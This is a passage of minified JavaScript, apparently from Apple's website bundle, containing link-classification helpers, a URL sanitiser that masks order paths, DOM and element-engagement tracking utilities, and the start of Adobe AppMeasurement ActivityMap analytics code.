obj&&obj.__esModule?obj:{default:obj}}(require("./isValidLink.js")),_hasPropertyValue=require("./hasPropertyValue.js");var PROTOCOLS=["applenews:","itms-apps:"],HOSTNAMES=["apps.apple.com","news.apple.com","music.apple.com","wallet.apple.com","tv.apple.com","books.apple.com"];exports.isServiceSERPLink=function isServiceSERPLink(element){return(0,_isValidLink.default)(element)&&((0,_hasPropertyValue.hasPropertyValue)({element:element,property:"protocol",values:PROTOCOLS})||(0,_hasPropertyValue.hasPropertyValue)({element:element,property:"hostname",values:HOSTNAMES}))}},{"./hasPropertyValue.js":232,"./isValidLink.js":247}],243:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _classListContains=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./classListContains.js"));exports.default=function isSignInLink(element){return(0,_classListContains.default)(element,"ac-gn-bagview-nav-link-signIn")}},{"./classListContains.js":229}],244:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _classListContains=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./classListContains.js"));exports.default=function isSignOutLink(element){return(0,_classListContains.default)(element,"ac-gn-bagview-nav-link-signOut")}},{"./classListContains.js":229}],245:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.isStoreSERPLink=void 0;var _isValidLink=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./isValidLink.js")),_hasPropertyValue=require("./hasPropertyValue.js");exports.isStoreSERPLink=function isStoreSERPLink(element){return(0,_isValidLink.default)(element)&&(0,_hasPropertyValue.hasPropertyValue)({element:element,property:"hostname",values:["apps.apple.com"]})}},{"./hasPropertyValue.js":232,"./isValidLink.js":247}],246:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function isTargetingOtherWindow(element,event){if(!element||!event)return!1;var elementTarget=(element.target||"").toLowerCase();return event.metaKey||event.ctrlKey||event.shiftKey||["","_self","_parent","_top"].every((function(target){return target!==elementTarget}))||window.name.length>0&&elementTarget.length>0&&elementTarget!==window.name}},{}],247:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function isValidLink(element){if(!element)return!1;if("A"!==element.tagName)return!1;var href=(element.getAttribute("href")||"").trim();return href.length>0&&0!==href.indexOf("#")&&0!==href.indexOf("about:")&&0!==href.indexOf("javascript:")&&0!==href.indexOf("mailto:")&&0!==href.indexOf("tel:")&&!element.dataset.analyticsIntrapageLink}},{}],248:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _classListContains=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./classListContains.js"));exports.default=function redirectsToSignInLink(element){return(0,_classListContains.default)(element,"ac-gn-bagview-nav-link-favorites","ac-gn-bagview-nav-link-orders","ac-gn-bagview-nav-link-account","ac-gn-bagview-nav-link-signIn")}},{"./classListContains.js":229}],249:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function resolvesToSearchPage(element){return!!element&&/\/search\//.test(element.getAttribute("href"))}},{}],250:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.sanitizeUrl=void 0;var _index=require("../stringHelpers/index.js");exports.sanitizeUrl=function sanitizeUrl(){var _ref=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},url=_ref.url,pageType=_ref.pageType,isReferrerUrl=_ref.isReferrerUrl,result=(0,_index.toStrTrim)(url);if(!result)return"";(isReferrerUrl||"string"==typeof pageType&&"errorpage"===pageType.toLowerCase())&&(result=result.replace(/\/vieworder\/.*/,"/vieworder/******")),result=(result=(result=(result=(result=result.replace(/\/order\/guest\/.*/,"/order/guest/******")).replace(/\/order\/applynow\/ep_payments\/.*/,"/order/applynow/ep_payments/******")).replace(/\/onMyWay\/.*/,"/onMyWay/******")).replace(/\/startPickup\/.*/,"/startPickup/******")).replace(/\/[^/]+@.*/i,"/******");var resultUrl=new URL(result);/(\/shop(\/[^/\n\r]*)?\/(sign|log)_?in)/i.test(resultUrl.pathname)&&(resultUrl.search="");var params=new URLSearchParams(resultUrl.search);return params.delete("fnode"),resultUrl.search=params.toString(),resultUrl.toString()}},{"../stringHelpers/index.js":222}],251:[function(require,module,exports){"use strict";var enabled=!1,_window={};"undefined"!=typeof window&&(_window=window||self);try{enabled=!!_window.localStorage.getItem("f7c9180f-5c45-47b4-8de4-428015f096c0")}catch(err){}module.exports=enabled},{}],252:[function(require,module,exports){"use strict";var enabled=require("../enabled");module.exports=function expose(funcName){return function(){if(enabled&&"object"==typeof window.console&&"function"==typeof console[funcName])return console[funcName].apply(console,Array.prototype.slice.call(arguments,0))}}},{"../enabled":251}],253:[function(require,module,exports){"use strict";module.exports=require("./internal/expose")("log")},{"./internal/expose":252}],254:[function(require,module,exports){"use strict";module.exports=require("./internal/expose")("trace")},{"./internal/expose":252}],255:[function(require,module,exports){"use strict";module.exports=function getDimensions(el,rendered){var rect;return rendered?{width:(rect=el.getBoundingClientRect()).width,height:rect.height}:{width:el.offsetWidth,height:el.offsetHeight}}},{}],256:[function(require,module,exports){"use strict";var getDimensions=require("./getDimensions"),getScrollX=require("./getScrollX"),getScrollY=require("./getScrollY");module.exports=function getPagePosition(el,rendered){var rect,scrollX,scrollY,dimensions;if(rendered)return rect=el.getBoundingClientRect(),scrollX=getScrollX(),scrollY=getScrollY(),{top:rect.top+scrollY,right:rect.right+scrollX,bottom:rect.bottom+scrollY,left:rect.left+scrollX};for(dimensions=getDimensions(el,rendered),rect={top:el.offsetTop,left:el.offsetLeft,width:dimensions.width,height:dimensions.height};el=el.offsetParent;)rect.top+=el.offsetTop,rect.left+=el.offsetLeft;return{top:rect.top,right:rect.left+rect.width,bottom:rect.top+rect.height,left:rect.left}}},{"./getDimensions":255,"./getScrollX":257,"./getScrollY":258}],257:[function(require,module,exports){"use strict";module.exports=function getScrollX(el){return(el=el||window)===window?window.scrollX||window.pageXOffset:el.scrollLeft}},{}],258:[function(require,module,exports){"use strict";module.exports=function getScrollY(el){return(el=el||window)===window?window.scrollY||window.pageYOffset:el.scrollTop}},{}],259:[function(require,module,exports){"use strict";module.exports=Object.freeze({ELEMENT:1,TEXT:3,COMMENT:8,DOCUMENT:9,DOCUMENT_TYPE:10,DOCUMENT_FRAGMENT:11})},{}],260:[function(require,module,exports){"use strict";module.exports={createDocumentFragment:require("./createDocumentFragment"),filterByNodeType:require("./filterByNodeType"),insertAfter:require("./insertAfter"),insertBefore:require("./insertBefore"),insertFirstChild:require("./insertFirstChild"),isNode:require("./isNode"),isNodeList:require("./isNodeList"),isNodeType:require("./isNodeType"),replace:require("./replace"),NODE_TYPES:require("./NODE_TYPES")}},{"./NODE_TYPES":259,"./createDocumentFragment":261,"./filterByNodeType":262,"./insertAfter":263,"./insertBefore":264,"./insertFirstChild":265,"./isNode":267,"./isNodeList":268,"./isNodeType":269,"./replace":270}],261:[function(require,module,exports){"use strict";module.exports=function createDocumentFragment(html){var div,fragment=document.createDocumentFragment();if(html)for((div=document.createElement("div")).innerHTML=html;div.firstChild;)fragment.appendChild(div.firstChild);return fragment}},{}],262:[function(require,module,exports){"use strict";var isNodeType=require("./isNodeType"),ELEMENT_NODE=require("./NODE_TYPES").ELEMENT;module.exports=function filterByNodeType(nodes,nodeType){return nodeType=nodeType||ELEMENT_NODE,(nodes=Array.prototype.slice.call(nodes)).filter((function(node){return isNodeType(node,nodeType)}))}},{"./NODE_TYPES":259,"./isNodeType":269}],263:[function(require,module,exports){"use strict";var validate=require("./internal/validate");module.exports=function insertAfter(node,target){return validate.insertNode(node,"insertAfter"),validate.childNode(target,"insertAfter"),validate.hasParentNode(target,"insertAfter"),target.nextSibling?target.parentNode.insertBefore(node,target.nextSibling):target.parentNode.appendChild(node)}},{"./internal/validate":266}],264:[function(require,module,exports){"use strict";var validate=require("./internal/validate");module.exports=function insertBefore(node,target){return validate.insertNode(node,"insertBefore"),validate.childNode(target,"insertBefore"),validate.hasParentNode(target,"insertBefore"),target.parentNode.insertBefore(node,target)}},{"./internal/validate":266}],265:[function(require,module,exports){"use strict";var validate=require("./internal/validate");module.exports=function insertFirstChild(node,target){return validate.insertNode(node,"insertFirstChild"),validate.parentNode(target,"insertFirstChild"),target.firstChild?target.insertBefore(node,target.firstChild):target.appendChild(node)}},{"./internal/validate":266}],266:[function(require,module,exports){"use strict";var isNodeType=require("../isNodeType"),NODE_TYPES=require("../NODE_TYPES"),COMMENT_NODE=NODE_TYPES.COMMENT,DOCUMENT_FRAGMENT_NODE=NODE_TYPES.DOCUMENT_FRAGMENT,ELEMENT_NODE=NODE_TYPES.ELEMENT,TEXT_NODE=NODE_TYPES.TEXT,VALID_INSERT_NODE=[ELEMENT_NODE,TEXT_NODE,COMMENT_NODE,DOCUMENT_FRAGMENT_NODE],VALID_CHILD_NODE=[ELEMENT_NODE,TEXT_NODE,COMMENT_NODE],VALID_PARENT_NODE=[ELEMENT_NODE,DOCUMENT_FRAGMENT_NODE];module.exports={parentNode:function(node,funcName,paramName){if(paramName=paramName||"target",node&&!isNodeType(node,VALID_PARENT_NODE))throw new TypeError(funcName+": "+paramName+" must be an Element, or Document Fragment")},childNode:function(node,funcName,paramName){if(paramName=paramName||"target",node&&!isNodeType(node,VALID_CHILD_NODE))throw new TypeError(funcName+": "+paramName+" must be an Element, TextNode, or Comment")},insertNode:function(node,funcName,paramName){if(paramName=paramName||"node",node&&!isNodeType(node,VALID_INSERT_NODE))throw new TypeError(funcName+": "+paramName+" must be an Element, TextNode, Comment, or Document Fragment")},hasParentNode:function(node,funcName,paramName){if(paramName=paramName||"target",!node.parentNode)throw new TypeError(funcName+": "+paramName+" must have a parentNode")}}},{"../NODE_TYPES":259,"../isNodeType":269}],267:[function(require,module,exports){"use strict";module.exports=function isNode(obj){return!(!obj||!obj.nodeType)}},{}],268:[function(require,module,exports){"use strict";var nodeListToStringPattern=/^\[object (HTMLCollection|NodeList|Object)\]$/;module.exports=function isNodeList(obj){return!!obj&&("number"==typeof obj.length&&(!!("object"!=typeof obj[0]||obj[0]&&obj[0].nodeType)&&nodeListToStringPattern.test(Object.prototype.toString.call(obj))))}},{}],269:[function(require,module,exports){"use strict";var isNode=require("./isNode");module.exports=function isNodeType(node,nodeType){return!!isNode(node)&&("number"==typeof nodeType?node.nodeType===nodeType:!!Array.isArray(nodeType)&&-1!==nodeType.indexOf(node.nodeType))}},{"./isNode":267}],270:[function(require,module,exports){"use strict";var validate=require("./internal/validate");module.exports=function replace(newNode,oldNode){return validate.insertNode(newNode,"insertFirstChild","newNode"),validate.childNode(oldNode,"insertFirstChild","oldNode"),validate.hasParentNode(oldNode,"insertFirstChild","oldNode"),oldNode.parentNode.replaceChild(newNode,oldNode)}},{"./internal/validate":266}],271:[function(require,module,exports){var ElementEngagement=require("./ac-element-engagement/ElementEngagement");module.exports=new ElementEngagement,module.exports.ElementEngagement=ElementEngagement},{"./ac-element-engagement/ElementEngagement":272}],272:[function(require,module,exports){"use strict";var proto,EventEmitterMicro=require("@marcom/ac-event-emitter-micro").EventEmitterMicro,ac_Object={defaults:require("@marcom/ac-object/defaults"),extend:require("@marcom/ac-object/extend")},Super=require("@marcom/ac-element-tracker").ElementTracker,trackedElementDefaults={timeToEngage:500,inViewThreshold:.75,stopOnEngaged:!0},extendedTrackedElementProps={thresholdEnterTime:0,thresholdExitTime:0,inThreshold:!1,engaged:!1,tracking:!0},ElementEngagement=function(options){Super.call(this,null,options),EventEmitterMicro.call(this),this._thresholdEnter=this._thresholdEnter.bind(this),this._thresholdExit=this._thresholdExit.bind(this),this._enterView=this._enterView.bind(this),this._exitView=this._exitView.bind(this)};proto=ElementEngagement.prototype=Object.create(Super.prototype),(proto=ac_Object.extend(proto,EventEmitterMicro.prototype))._decorateTrackedElement=function(trackedElement,options){var extendedDefaults;extendedDefaults=ac_Object.defaults(trackedElementDefaults,options||{}),ac_Object.extend(trackedElement,extendedDefaults),ac_Object.extend(trackedElement,extendedTrackedElementProps)},proto._attachElementListeners=function(trackedElement){trackedElement.on("thresholdenter",this._thresholdEnter,this),trackedElement.on("thresholdexit",this._thresholdExit,this),trackedElement.on("enterview",this._enterView,this),trackedElement.on("exitview",this._exitView,this)},proto._removeElementListeners=function(trackedElement){trackedElement.off("thresholdenter",this._thresholdEnter),trackedElement.off("thresholdexit",this._thresholdExit),trackedElement.off("enterview",this._enterView),trackedElement.off("exitview",this._exitView)},proto._attachAllElementListeners=function(){this.elements.forEach((function(trackedElement){trackedElement.stopOnEngaged&&trackedElement.engaged||this._attachElementListeners(trackedElement)}),this)},proto._removeAllElementListeners=function(){this.elements.forEach((function(trackedElement){this._removeElementListeners(trackedElement)}),this)},proto._elementInViewPastThreshold=function(trackedElement){return trackedElement.pixelsInView===this._windowHeight||trackedElement.percentInView>trackedElement.inViewThreshold},proto._ifInView=function(trackedElement,alreadyInView){var alreadyInThreshold=trackedElement.inThreshold;Super.prototype._ifInView.apply(this,arguments),!alreadyInThreshold&&this._elementInViewPastThreshold(trackedElement)&&(trackedElement.inThreshold=!0,trackedElement.trigger("thresholdenter",trackedElement),"number"==typeof trackedElement.timeToEngage&&trackedElement.timeToEngage>=0&&(trackedElement.engagedTimeout=window.setTimeout(this._engaged.bind(this,trackedElement),trackedElement.timeToEngage)))},proto._ifAlreadyInView=function(trackedElement){var alreadyInThreshold=trackedElement.inThreshold;Super.prototype._ifAlreadyInView.apply(this,arguments),alreadyInThreshold&&!this._elementInViewPastThreshold(trackedElement)&&(trackedElement.inThreshold=!1,trackedElement.trigger("thresholdexit",trackedElement),trackedElement.engagedTimeout&&(window.clearTimeout(trackedElement.engagedTimeout),trackedElement.engagedTimeout=null))},proto._engaged=function(trackedElement){trackedElement.engagedTimeout=null,this._elementEngaged(trackedElement),trackedElement.trigger("engaged",trackedElement),this.trigger("engaged",trackedElement)},proto._thresholdEnter=function(trackedElement){trackedElement.thresholdEnterTime=Date.now(),trackedElement.thresholdExitTime=0,this.trigger("thresholdenter",trackedElement)},proto._thresholdExit=function(trackedElement){trackedElement.thresholdExitTime=Date.now(),this.trigger("thresholdexit",trackedElement)},proto._enterView=function(trackedElement){this.trigger("enterview",trackedElement)},proto._exitView=function(trackedElement){this.trigger("exitview",trackedElement)},proto._elementEngaged=function(trackedElement){trackedElement.engaged=!0,trackedElement.stopOnEngaged&&this.stop(trackedElement)},proto.stop=function(trackedElement){this.tracking&&!trackedElement&&(this._removeAllElementListeners(),Super.prototype.stop.call(this)),trackedElement&&trackedElement.tracking&&(trackedElement.tracking=!1,this._removeElementListeners(trackedElement),this.removeElement(trackedElement))},proto.start=function(trackedElement){trackedElement||this._attachAllElementListeners(),trackedElement&&!trackedElement.tracking&&(trackedElement.stopOnEngaged&&trackedElement.engaged||(trackedElement.tracking=!0,this._attachElementListeners(trackedElement))),this.tracking?(this.refreshAllElementMetrics(),this.refreshAllElementStates()):Super.prototype.start.call(this)},proto.addElement=function(element,options){options=options||{};var trackedElement=Super.prototype.addElement.call(this,element,options.useRenderedPosition);return this._decorateTrackedElement(trackedElement,options),trackedElement},proto.addElements=function(collection,options){[].forEach.call(collection,(function(element){this.addElement(element,options)}),this)},module.exports=ElementEngagement},{"@marcom/ac-element-tracker":278,"@marcom/ac-event-emitter-micro":281,"@marcom/ac-object/defaults":284,"@marcom/ac-object/extend":285}],273:[function(require,module,exports){"use strict";module.exports=1},{}],274:[function(require,module,exports){"use strict";var isNode=require("../isNode");module.exports=function isNodeType(node,nodeType){return!!isNode(node)&&("number"==typeof nodeType?node.nodeType===nodeType:-1!==nodeType.indexOf(node.nodeType))}},{"../isNode":276}],275:[function(require,module,exports){"use strict";var isNodeType=require("./internal/isNodeType"),ELEMENT_NODE=require("./ELEMENT_NODE");module.exports=function isElement(obj){return isNodeType(obj,ELEMENT_NODE)}},{"./ELEMENT_NODE":273,"./internal/isNodeType":274}],276:[function(require,module,exports){"use strict";module.exports=function isNode(obj){return!(!obj||!obj.nodeType)}},{}],277:[function(require,module,exports){"use strict";var nodeListToStringPattern=/^\[object (HTMLCollection|NodeList|Object)\]$/;module.exports=function isNodeList(obj){return!!obj&&("number"==typeof obj.length&&(!!("object"!=typeof obj[0]||obj[0]&&obj[0].nodeType)&&nodeListToStringPattern.test(Object.prototype.toString.call(obj))))}},{}],278:[function(require,module,exports){var ElementTracker=require("./ac-element-tracker/ElementTracker"),TrackedElement=require("./ac-element-tracker/TrackedElement");module.exports=new ElementTracker,module.exports.ElementTracker=ElementTracker,module.exports.TrackedElement=TrackedElement},{"./ac-element-tracker/ElementTracker":279,"./ac-element-tracker/TrackedElement":280}],279:[function(require,module,exports){"use strict";var ac_dom_nodes={isNodeList:require("@marcom/ac-dom-nodes/isNodeList"),isElement:require("@marcom/ac-dom-nodes/isElement")},ac_dom_metrics={getDimensions:require("@marcom/ac-dom-metrics/getDimensions"),getPagePosition:require("@marcom/ac-dom-metrics/getPagePosition"),getScrollY:require("@marcom/ac-dom-metrics/getScrollY")},ac_Object={clone:require("@marcom/ac-object/clone"),extend:require("@marcom/ac-object/extend")},TrackedElement=require("./TrackedElement"),defaultOptions={autoStart:!1,useRenderedPosition:!1};function ElementTracker(elements,options){this.options=ac_Object.clone(defaultOptions),this.options="object"==typeof options?ac_Object.extend(this.options,options):this.options,this._scrollY=this._getScrollY(),this._windowHeight=this._getWindowHeight(),this.tracking=!1,this.elements=[],elements&&(Array.isArray(elements)||ac_dom_nodes.isNodeList(elements)||ac_dom_nodes.isElement(elements))&&this.addElements(elements),this.refreshAllElementStates=this.refreshAllElementStates.bind(this),this.refreshAllElementMetrics=this.refreshAllElementMetrics.bind(this),this.options.autoStart&&this.start()}var proto=ElementTracker.prototype;proto.destroy=function(){var i,len;for(this.stop(),i=0,len=this.elements.length;i<len;i++)this.elements[i].destroy();this.elements=null,this.options=null},proto._registerTrackedElements=function(trackedElements){[].concat(trackedElements).forEach((function(object){this._elementInDOM(object.element)&&(object.offsetTop=object.element.offsetTop,this.elements.push(object))}),this)},proto._elementInDOM=function(element){var assertion=!1,body=document.getElementsByTagName("body")[0];return ac_dom_nodes.isElement(element)&&body.contains(element)&&(assertion=!0),assertion},proto._elementPercentInView=function(trackedElement){return trackedElement.pixelsInView/trackedElement.height},proto._elementPixelsInView=function(trackedElement){var elementTop=trackedElement.top-this._scrollY,elementBottom=trackedElement.bottom-this._scrollY;return elementTop>this._windowHeight||elementBottom<0?0:Math.min(elementBottom,this._windowHeight)-Math.max(elementTop,0)},proto._ifInView=function(trackedElement,alreadyInView){alreadyInView||trackedElement.trigger("enterview",trackedElement)},proto._ifAlreadyInView=function(trackedElement){trackedElement.inView||trackedElement.trigger("exitview",trackedElement)},proto.addElements=function(collection,useRenderedPosition){void 0===useRenderedPosition&&(useRenderedPosition=this.options.useRenderedPosition);for(var i=0,len=(collection=ac_dom_nodes.isNodeList(collection)?Array.prototype.slice.call(collection):[].concat(collection)).length;i<len;i++)this.addElement(collection[i],useRenderedPosition)},proto.addElement=function(element,useRenderedPosition){var trackedElement=null;if(void 0===useRenderedPosition&&(useRenderedPosition=this.options.useRenderedPosition),!ac_dom_nodes.isElement(element))throw new TypeError("ElementTracker: "+element+" is not a valid DOM element");return trackedElement=new TrackedElement(element,useRenderedPosition),this._registerTrackedElements(trackedElement),this.refreshElementMetrics(trackedElement),this.refreshElementState(trackedElement),trackedElement},proto.removeElement=function(element){var filtered,indexes=[];this.elements.forEach((function(trackedElement,i){trackedElement!==element&&trackedElement.element!==element||indexes.push(i)})),filtered=this.elements.filter((function(element,i){return indexes.indexOf(i)<0})),this.elements=filtered},proto.start=function(){!1===this.tracking&&(this.tracking=!0,window.addEventListener("resize",this.refreshAllElementMetrics),window.addEventListener("orientationchange",this.refreshAllElementMetrics),window.addEventListener("scroll",this.refreshAllElementStates),this.refreshAllElementMetrics())},proto.stop=function(){!0===this.tracking&&(this.tracking=!1,window.removeEventListener("resize",this.refreshAllElementMetrics),window.removeEventListener("orientationchange",this.refreshAllElementMetrics),window.removeEventListener("scroll",this.refreshAllElementStates))},proto.refreshAllElementMetrics=function(currentScrollY,windowHeight){"number"!=typeof currentScrollY&&(currentScrollY=this._getScrollY()),"number"!=typeof windowHeight&&(windowHeight=this._getWindowHeight()),this._scrollY=currentScrollY,this._windowHeight=windowHeight,this.elements.forEach(this.refreshElementMetrics,this)},proto.refreshElementMetrics=function(trackedElement){if(!trackedElement.isActive)return trackedElement;var dimensions=ac_dom_metrics.getDimensions(trackedElement.element,trackedElement.useRenderedPosition),position=ac_dom_metrics.getPagePosition(trackedElement.element,trackedElement.useRenderedPosition);return trackedElement=ac_Object.extend(trackedElement,dimensions,position),this.refreshElementState(trackedElement)},proto.refreshAllElementStates=function(currentScrollY){"number"!=typeof currentScrollY&&(currentScrollY=this._getScrollY()),this._scrollY=currentScrollY,this.elements.forEach(this.refreshElementState,this)},proto.refreshElementState=function(trackedElement){if(!trackedElement.isActive)return trackedElement;var alreadyInView=trackedElement.inView;return trackedElement.pixelsInView=this._elementPixelsInView(trackedElement),trackedElement.percentInView=this._elementPercentInView(trackedElement),trackedElement.inView=trackedElement.pixelsInView>0,trackedElement.inView&&this._ifInView(trackedElement,alreadyInView),alreadyInView&&this._ifAlreadyInView(trackedElement),trackedElement},proto.pauseElementTracking=function(trackedElement){trackedElement&&(trackedElement.isActive=!1)},proto.resumeElementTracking=function(trackedElement){trackedElement&&(trackedElement.isActive=!0)},proto._getWindowHeight=function(){return window.innerHeight},proto._getScrollY=function(){return ac_dom_metrics.getScrollY()},module.exports=ElementTracker},{"./TrackedElement":280,"@marcom/ac-dom-metrics/getDimensions":255,"@marcom/ac-dom-metrics/getPagePosition":256,"@marcom/ac-dom-metrics/getScrollY":258,"@marcom/ac-dom-nodes/isElement":275,"@marcom/ac-dom-nodes/isNodeList":277,"@marcom/ac-object/clone":283,"@marcom/ac-object/extend":285}],280:[function(require,module,exports){"use strict";var ac_dom_nodes={isElement:require("@marcom/ac-dom-nodes/isElement")},EventEmitterMicro=require("@marcom/ac-event-emitter-micro").EventEmitterMicro,superclass=EventEmitterMicro.prototype;function TrackedElement(element,useRenderedPosition){if(!ac_dom_nodes.isElement(element))throw new TypeError("TrackedElement: "+element+" is not a valid DOM element");EventEmitterMicro.call(this),this.element=element,this.inView=!1,this.isActive=!0,this.percentInView=0,this.pixelsInView=0,this.offsetTop=0,this.top=0,this.right=0,this.bottom=0,this.left=0,this.width=0,this.height=0,this.useRenderedPosition=useRenderedPosition||!1}(TrackedElement.prototype=Object.create(superclass)).destroy=function(){this.element=null,superclass.destroy.call(this)},module.exports=TrackedElement},{"@marcom/ac-dom-nodes/isElement":275,"@marcom/ac-event-emitter-micro":281}],281:[function(require,module,exports){"use strict";module.exports={EventEmitterMicro:require("./ac-event-emitter-micro/EventEmitterMicro")}},{"./ac-event-emitter-micro/EventEmitterMicro":282}],282:[function(require,module,exports){"use strict";function EventEmitterMicro(){this._events={}}let proto=EventEmitterMicro.prototype;proto.on=function(eventName,callback){return this._events[eventName]=this._events[eventName]||[],this._events[eventName].unshift(callback),callback},proto.once=function(eventName,callback){let that=this;return this.on(eventName,(function fn(data){that.off(eventName,fn),void 0!==data?callback(data):callback()}))},proto.off=function(eventName,callback){if(!this.has(eventName))return;if(1===arguments.length)return this._events[eventName]=null,void delete this._events[eventName];let index=this._events[eventName].indexOf(callback);-1!==index&&this._events[eventName].splice(index,1)},proto.trigger=function(eventName,data){if(this.has(eventName))for(let i=this._events[eventName].length-1;i>=0;i--)void 0!==data?this._events[eventName][i](data):this._events[eventName][i]()},proto.has=function(eventName){return eventName in this._events!=!1&&0!==this._events[eventName].length},proto.destroy=function(){for(let eventName in this._events)this._events[eventName]=null;this._events=null},module.exports=EventEmitterMicro},{}],283:[function(require,module,exports){"use strict";require("@marcom/ac-polyfills/Array/isArray");var extend=require("./extend"),hasOwnProp=Object.prototype.hasOwnProperty,deepClone=function(dest,source){var prop;for(prop in source)hasOwnProp.call(source,prop)&&(null===source[prop]?dest[prop]=null:"object"==typeof source[prop]?(dest[prop]=Array.isArray(source[prop])?[]:{},deepClone(dest[prop],source[prop])):dest[prop]=source[prop]);return dest};module.exports=function clone(object,deep){return deep?deepClone({},object):extend({},object)}},{"./extend":285,"@marcom/ac-polyfills/Array/isArray":286}],284:[function(require,module,exports){"use strict";var extend=require("./extend");module.exports=function defaults(defaultsObj,options){if("object"!=typeof defaultsObj)throw new TypeError("defaults: must provide a defaults object");if("object"!=typeof(options=options||{}))throw new TypeError("defaults: options must be a typeof object");return extend({},defaultsObj,options)}},{"./extend":285}],285:[function(require,module,exports){"use strict";require("@marcom/ac-polyfills/Array/prototype.forEach");var hasOwnProp=Object.prototype.hasOwnProperty;module.exports=function extend(){var args,dest;return args=arguments.length<2?[{},arguments[0]]:[].slice.call(arguments),dest=args.shift(),args.forEach((function(source){if(null!=source)for(var property in source)hasOwnProp.call(source,property)&&(dest[property]=source[property])})),dest}},{"@marcom/ac-polyfills/Array/prototype.forEach":287}],286:[function(require,module,exports){Array.isArray||(Array.isArray=function(arg){return"[object Array]"===Object.prototype.toString.call(arg)})},{}],287:[function(require,module,exports){Array.prototype.forEach||(Array.prototype.forEach=function forEach(callback,thisObj){var i,currentValue,arrayObject=Object(this);if("function"!=typeof callback)throw new TypeError("No function object passed to forEach.");var length=this.length;for(i=0;i<length;i+=1)currentValue=arrayObject[i],callback.call(thisObj,currentValue,i,arrayObject)})},{}],288:[function(require,module,exports){"use strict";var appMeasurementSetup=require("./appmeasurement-setup/AppMeasurementSetup");module.exports={init:appMeasurementSetup.init,getInstance:appMeasurementSetup.getInstance}},{"./appmeasurement-setup/AppMeasurementSetup":292}],289:[function(require,module,exports){!function(){function s_gi(r){var a,q,p,s,u,h=window.s_c_il,m=r.split(","),t=0;if(h)for(q=0;!t&&q<h.length;){if("s_c"==(a=h[q])._c&&(a.account||a.oun))if(a.account&&a.account==r)t=1;else for(p=a.account?a.account:a.oun,p=a.allAccounts?a.allAccounts:p.split(","),s=0;s<m.length;s++)for(u=0;u<p.length;u++)m[s]==p[u]&&(t=1);q++}return t?a.setAccount&&a.setAccount(r):a=new AppMeasurement(r),a}function s_pgicq(){var h,q,p,r=window,a=r.s_giq;if(a)for(h=0;h<a.length;h++)(p=s_gi((q=a[h]).oun)).setAccount(q.un),p.setTagContainer(q.tagContainerName);r.s_giq=0}window.AppMeasurement_Module_ActivityMap=function(k){function p(){var a=f.pageYOffset+(f.innerHeight||0);a&&a>+g&&(g=a)}function q(){if(e.scrollReachSelector){var a=k.d.querySelector&&k.d.querySelector(e.scrollReachSelector);a?(g=a.scrollTop||0,a.addEventListener("scroll",(function(){var d;(d=a&&a.scrollTop+a.clientHeight||0)>g&&(g=d)}))):0<v--&&setTimeout(q,1e3)}}function l(a,d){var b,c,n;if(a&&d&&(b=e.c[d]||(e.c[d]=d.split(","))))for(n=0;n<b.length&&(c=b[n++]);)if(-1<a.indexOf(c))return null;return a}function r(a,d,b,c,e){var f,h;if((a.dataset&&(h=a.dataset[d])||a.getAttribute&&((h=a.getAttribute("data-"+b))||(h=a.getAttribute(b))))&&(f=h),!f&&k.useForcedLinkTracking&&e){var g;if(a=a.onclick?""+a.onclick:"",d="",c&&a&&0<=(b=a.indexOf(c))){for(b+=c.length;b<a.length;)if(h=a.charAt(b++),0<="'\"".indexOf(h)){g=h;break}for(var l=!1;b<a.length&&g&&(h=a.charAt(b),l||h!==g);)"\\"===h?l=!0:(d+=h,l=!1),b++}(g=d)&&(k.w[c]=g)}return f||e&&k.w[c]}function s(a,d,b){var c;return(c=e[d](a,b))&&l(m(c),e[d+"Exclusions"])}function t(a,d,b){var c;if(a&&!(1===(c=a.nodeType)&&(c=a.nodeName)&&(c=c.toUpperCase())&&w[c])&&(1===a.nodeType&&(c=a.nodeValue)&&(d[d.length]=c),b.a||b.t||b.s||!a.getAttribute||((c=a.getAttribute("alt"))?b.a=c:(c=a.getAttribute("title"))?b.t=c:"IMG"==(""+a.nodeName).toUpperCase()&&(c=a.getAttribute("src")||a.src)&&(b.s=c)),(c=a.childNodes)&&c.length))for(a=0;a<c.length;a++)t(c[a],d,b)}function m(a){if(null==a||null==a)return a;try{return a.replace(RegExp("^[\\s\\n\\f\\r\\t\t-\r -\u2028\u2029\ufeff]+","mg"),"").replace(RegExp("[\\s\\n\\f\\r\\t\t-\r -\u2028\u2029\ufeff]+$","mg"),"").replace(RegExp("[\\s\\n\\f\\r\\t\t-\r -\u2028\u2029\ufeff]{1,}","mg")," ").substring(0,254)}catch(d){}}var e=this;e.s=k;var f=window;f.s_c_in||(f.s_c_il=[],f.s_c_in=0),e._il=f.s_c_il,e._in=f.s_c_in,e._il[e._in]=e,f.s_c_in++,e._c="s_m";var u,g=0,v=60;e.c={};var w={SCRIPT:1,STYLE:1,LINK:1,CANVAS:1};e._g=function(){var a,d,b,c=k.contextData,e=k.linkObject;(a=k.pageName||k.pageURL)&&(d=s(e,"link",k.linkName))&&(b=s(e,"region"))&&(c["a.activitymap.page"]=a.substring(0,255),c["a.activitymap.link"]=128<d.length?d.substring(0,128):d,c["a.activitymap.region"]=127<b.length?b.substring(0,127):b,0<g&&(c["a.activitymap.xy"]=10*Math.floor(g/10)),c["a.activitymap.pageIDType"]=k.pageName?1:0)},e._d=function(){e.trackScrollReach&&!u&&(e.scrollReachSelector?q():(p(),f.addEventListener&&f.addEventListener("scroll",p,!1)),u=!0)},e.link=function(a,d){var b;if(d)b=l(m(d),e.linkExclusions);else 